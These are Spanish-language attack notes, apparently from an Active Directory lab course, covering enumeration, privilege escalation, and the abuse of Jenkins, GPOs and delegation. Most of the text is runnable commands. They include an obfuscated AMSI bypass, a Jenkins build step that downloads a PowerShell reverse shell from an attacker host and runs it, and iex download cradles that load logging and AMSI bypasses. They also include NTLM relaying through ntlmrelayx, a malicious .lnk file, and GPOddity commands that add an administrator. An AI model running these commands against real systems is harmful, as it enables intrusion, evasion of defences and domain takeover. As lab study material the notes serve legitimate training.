
```ad-todo
- ¿Qué acceso tengo?
- ¿Qué puedo leer?
- ¿Qué credenciales puedo obtener?
- ¿Qué puedo controlar?
- ¿Eso me acerca al Domain Admin?
```


***InviShell***
```shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

***AMSI Bypass***
```shell
SeT-Item ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varIABLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."AssEmbly"."GETTYPe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."getfiElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sETVaLUE"(  ${nULl},${tRuE} )
```

***PowerView***
```shell
. C:\AD\tools\PowerView.ps1 
```

#### Quienes somos?
```shell
whoami
```

#### Pertenezco al grupo Administrators?
```shell
net localgroup Administrators
```

# Enumeración

***Listar los usuarios del dominio***
```shell
Get-DomainUser | select -ExpandProperty samaccountname
```

***Listar los nombres de equipos del dominio***
```shell
Get-DomainComputer | select -ExpandProperty dnshostname | Out-File -FilePath "C:\AD\Tools\servers.txt"
```

***Información sobre el grupo de Domain Admins***
```shell
Get-DomainGroup -Identity "Domain Admins"
```

***Listar usuarios del grupo Domain Admins***
```shell
Get-DomainGroupMember -Identity "Domain Admins"
```

> Con esta ejecución podemos obtener los SID de los usuarios que pertenecen a este grupo
> 
> Listar los usuarios que pertenecen al grupo Enterprise Admins, se hace con el mismo comando solo que modificando el valor de Identity

El grupo de Enterprise Admins solo se encuentra en el dominio padre asi que deberemos de enumerar el grupo en el

***Listar grupo Enterprise Admins en el dominio padre***
```shell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

***Encontrar archivos compartidos donde tenemos permisos de escritura***
Deberemos de importar la herramienta de *PowerHunShares*
```ad-warning
Esta herramienta no se puede ejecutar en una maquina que tenga invocado el *PowerView* Y deberemos de tener una nueva shell aparte
```
```shell
Import-Module .\PowerHuntShares.psm1
```

```shell
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\Ad\Tools -Hostlist .\servers.txt
```

***Constrain Delegation***
```shell
Get-NetComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto | Format-List
```

## ENUMERACION DE SERVICIOS CORRIENDO EN EL DOMINIO
```shell
$Ports = @(80,443,8080,8443,3389,445,135,5985,5986,22,1433,3306,5432)

Get-DomainComputer | Select-Object -ExpandProperty DNSHostName | ForEach-Object {

    $HostName = $_

    try {

        $IP = (Resolve-DnsName $HostName -Type A -ErrorAction Stop |
               Select-Object -First 1 -ExpandProperty IPAddress)

        $OpenPorts = foreach($Port in $Ports) {

            try {

                $TcpClient = New-Object System.Net.Sockets.TcpClient
                $Connect = $TcpClient.BeginConnect($HostName,$Port,$null,$null)

                if($Connect.AsyncWaitHandle.WaitOne(500,$false))
                {
                    $TcpClient.EndConnect($Connect)
                    $TcpClient.Close()
                    $Port
                }
                else
                {
                    $TcpClient.Close()
                }

            } catch {}
        }

        if($OpenPorts)
        {
            [PSCustomObject]@{
                DNSHostName = $HostName
                IP          = $IP
                OpenPorts   = ($OpenPorts -join ",")
            }
        }

    } catch {}
} | Format-Table -AutoSize
```

# Escalada de privilegios

### Explotar servicio
#### PowerUP
```shell
. .\PowerUp.ps1 
```

***Encontrar servicios que nos permitan escalar privilegios***
```shell
Invoke-AllChecks 
```

> Tenemos dos tipos de servicios:
> 	- Unquoted Service Paths -> Nos permite aprovecharnos por que la ruta del servicio esta sin comillas
> 	- Modifiable Service Files -> Son servicios que pueden ser modificados, si tienen *CanRestart = True* significa que el atacante lo puede reiniciar para escalar privilegios

Nos añadiremos al servicio que y se nos agregara el usuario al grupo Administrators
```shell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -username 'dcorp\student97'
```

Para comprobar que hemos sido añadidos usaremos
```shell
net localgroup Administrators
```

>Viendo a nuestro usuario reflejado dentro del grupo

Tendremos que hacer *LogOut* para que se apliquen los cambios

***También se puede ver diferentes paths de escaladas de privilegios o simplemente enumerar todos los ámbitos posibles usando otras herramientas***
#### PrivEscCheck
```shell
. .\PrivEscCheck.ps1
```

```shell
Invoke-PrivescCheck
```
#### WinPEAS
```shell
.\winPEASx64.exe
```
### Buscar maquinas donde tenemos acceso como Admin
```shell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```
```shell
Find-PSRemotingLocalAdminAccess
```
### Abuso de Jenkins
Deberemos de acceder al Jenkins en la URL correspondiente, En *Peopel* encontraremos usuarios por lo que podemos probar a usar *user-as-password* 

Después de eso deberemos iniciar *HSF* y cargar en el *Invoke-PowerShellTCP.ps1*, *Amsi-Byp.txt*, *Loader.exe*, *PowerView.ps1*, *SafetyKatz.exe* y *sbloggingbypass.txt*

Irnos a un proyecto, editarlo y añadir la siguiente reverse shell
```shell
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 1889
```

También deberemos de ponernos en escucha desde nuestra shell
```shell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1889
```

Deberemos de darle a Build y esperar la respuesta de la Reverse Shell
### Abuso de GPO
#### GPOddity
Teniendo en el objetivo permisos de escritura sobre un recurso compartido y haber descubierto por ejemplo que se dedica a automatizar ejecuciones de *.lnk*, y también descubrir que el usuario que lo ejecuta tiene *GenericAll* sobre la política del grupo al que pertenece deberemos intentar explotar esta vulnerabilidad.

```ad-info
Deberemos de tener el SID de la politica sobre la que abusaremos primero ver las politicas del equipo que tiene el recurso compartido
*Get-DomainGPO -ComputerIdentity DCORP-CI*

Y despues obtener el SID de la politica
*Get-DomainGPO -Identity 'DevOps Policy'*
```

```ad-warning
El firewal debe de estar desactivado
```

Primero deberemos de acceder al WSL (*WSLToTh3Rescue!*) y ejecutar la herraminta *ntlmrelayx*
```shell
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
```

En nuestra maquina dberemos de crear un acceso directo *.lnk*
```shell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.X' -UseDefaultCredentials"
```

Deberemos copiarlo al recurso sobre el que podemos escribir
```sehll
xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
```

Y en el WSL se ejecutara el archivo que hemos envia permitiendonos acceder a una shell de *LDAP*
```shell
nc 127.0.0.1 11000
```

Deberemos de crear un nuevo equipo
```shell
add_computer stdX-gpattack Secretpass@123
```

Y añadir este a la Politica
```shell
write_gpo_dacl stdX-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

Una vez ejecutado eso deberemos de detener la shell de *LDAP* y de *ntlmrelayx*
En WSL desplazarnos al directorio donde tenemos guardado GPOditty
```shell
cd /mnt/c/AD/Tools/GPOddity
```

Y ejecutar la herramienta
```shell
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
```

Desde otra sesion de WSL deberemos de crear un directorio con el mismo nombre indicado en el comando anterior
```shell
mkdir /mnt/c/AD/Tools/stdx-gp
```

Y compartirlo a una ruta conocida
```shell
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
```

Desde una CMD como Administrator debremos de darle permisos a ese carpeta comaprtida
```shell
net share stdX-gp=C:\AD\Tools\stdX-gp /grant:Everyone,Full
icacls "C:\AD\Tools\stdX-gp" /grant Everyone:F /T
```

Y verificar si la carpeta esta dentro de la politica
```shell
Get-DomainGPO -Identity 'DevOps Policy'
```

Si la politica se ha aplicado correctamente podremos acceder a la maquina
```shell
winrs -r:dcorp-ci cmd
```

## Movimiento Lateral
Para movernos a otras maquinas lo primero que deberemos de saber es sobre que maquinas disponen de una sesión de Domain Admin
```shell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1 
```
```shell
Find-PSRemotingLocalAdminAccess
```

Y podremos acceder a ella usando
```shell
Enter-PSSession -ComputerName target
```

Para que sea mas **OPSEC** y evitar hacer saltar las alarmar usaremos
```sehll
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
```

##### DESDE UN EQUIPO EN PROPIEDAD
Desde un equipo en propiedad deberemos de tener levantado *HSF* y tener publicado *Invoke-PowerShellTCP.ps1*, *Amsi-Byp.txt*, *Loader.exe*, *PowerView.ps1*, *SafetyKatz.exe* y *sbloggingbypass.txt*
 y ejecutar bypass correspondientes
 ```shell
 iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sbloggingbypass.txt')

iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-Byp.txt')

iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
 ```

Buscaremos ususarios conectados
```shell
Find-DomainUserLocation
```

En caso de que haya algun usuario conectado podemos acceder a el usando winrm
```shell
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

En ese ususario le podemos cargar el *Loader* para que ejecute *safetyKatz*
```shell

```

#### Uncosntrained delegation
Buscaremos equipos que tengan *Unconstrained delegation*
```shell
Get-DomainComputer -Unconstrained | select name
```

Y ahora buscaremos los ususarios que tengan *Unconstrained delegation*
```shell
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

#### Permisos GenericWrite
```shell
Find-InterestingDomainACL -ResolveGUIDs | 
  ?{$_.IdentityReferenceName -match $env:USERNAME} | 
  select ObjectDN, ActiveDirectoryRights
```


#### Server SQL
```PowerShell
Import-Module .\PowerUpSQL-master\PowerUpSQL.ps1
```

Enumeraremos los servers SQL 
```PowerShell
 Get-SQLInstanceDomain
```


#### Usuarios kerberoasteables

```powershell
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
```
